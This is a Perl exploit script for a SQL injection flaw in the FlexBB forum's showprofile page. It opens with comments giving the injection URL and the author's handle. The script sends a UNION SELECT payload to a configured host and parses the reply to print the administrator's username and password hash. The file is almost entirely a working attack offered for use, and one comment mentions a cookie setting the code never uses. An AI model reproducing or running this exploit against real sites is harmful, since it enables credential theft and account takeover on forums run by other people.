#!/usr/bin/perl
use IO::Socket;
#FlexBB Exploit [ function/showprofile.php ] Remote SQL Injection
#
#        1- First Do Login
#        2- View This Link :D
#
#        index.php?page=showprofile&id=-1' UNION ALL SELECT%201,username,3,4,5,6,7,8,9,0,1,2,3,password,5,6,7,8,9,0,1,2,3,4,3,4,5,7,8 FROM flexbb_users
WHERE id=1/*
#
#-----------------------------------------------#
#
#--[ D3vil-0x1 | Devil-00 ]--#
#
# SecurityGurus.net
#               Div The PHP Security Fucking Tool :D

##-- Start --#

$host         = "127.0.0.1";
$path         = "/flexbb/";
$injec        =
"-1'%20UNION%20ALL%20SELECT%201,username,3,4,5,6,7,8,9,0,1,2,3,password,5,6,7,8,9,0,1,2,3,4,3,4,5,7,8%20FROM%20flexbb_users%20WHERE%20id=1/*";

##-- _END_ --##
#        $host                :-
#                                The Host Name Without http:// | exm. www.vic.com
#
#        $path                :-
#                                FlexBB Dir On Server | exm. /flexbb/
#
#        $mycookie             :-
#                                Your Login Info To Forum *  Not The Real Password || The Hashed One *


$sock = IO::Socket::INET->new (
                                                                                PeerAddr => "$host",
                                                                                PeerPort => "80",
                                                                                Proto    => "tcp"
                                                                                ) or die("[!] Connect To Server Was Filed");

##-- DONT TRY TO EDIT ME --##
$evildata  = "GET ".$path."index.php?page=showprofile&id=".$injec." HTTP/1.1\n";
$evildata .= "Host: $host \n";
$evildata .= "Accept: */* \n";
$evildata .= "Keep-Alive: 300\n";
$evildata .= "Connection: keep-alive \n\n";

print $sock $evildata;

while($ans = <$sock>){
       $usr_newans = $ans;
       $pwd_newans = $ans;
       #print $newans;
       $usr_newans =~ m/<title>FlexBB - Viewing Profile: (.*?)<\/title>/ && print "[+] Username is :- ".$1."\n";
       $pwd_newans =~ m/<a href="2" target="_blank">(.*?)<\/a>/ && print "[+] Password is :- ".$1."\n";
}
